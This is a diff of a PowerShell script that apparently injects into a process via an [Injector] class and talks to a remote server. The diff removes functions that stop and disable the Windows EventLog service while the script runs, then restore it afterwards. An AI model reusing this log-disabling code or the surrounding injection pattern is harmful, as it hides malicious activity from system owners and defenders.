@@ -1,29 +1,6 @@
 # Force TLS 1.2 (required for Netlify HTTPS)
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# Function to disable Windows Event Log
-function Disable-WindowsEventLog {
-
-    try {
-        Stop-Service -Name "EventLog" -Force -ErrorAction Stop
-        Set-Service -Name "EventLog" -StartupType Disabled -ErrorAction Stop
-    } catch {
-    }
-}
-
-# Function to enable Windows Event Log
-function Enable-WindowsEventLog {
-
-    try {
-        Set-Service -Name "EventLog" -StartupType Automatic -ErrorAction Stop
-        Start-Service -Name "EventLog" -ErrorAction Stop
-    } catch {
-       
-    }
-}
-
-# Call Disable-WindowsEventLog at the beginning
-Disable-WindowsEventLog
 
 # Step 1: Get current user's SID
 try {
@@ -116,8 +93,6 @@ if ($response.success -eq $true) {
     Write-Host "[*] You can retry or contact support."
 }
 
-# Call Enable-WindowsEventLog at the end
-Enable-WindowsEventLog
 
 if ($hProc -ne [IntPtr]::Zero) {
     [Injector]::CloseHandle($hProc) | Out-Null
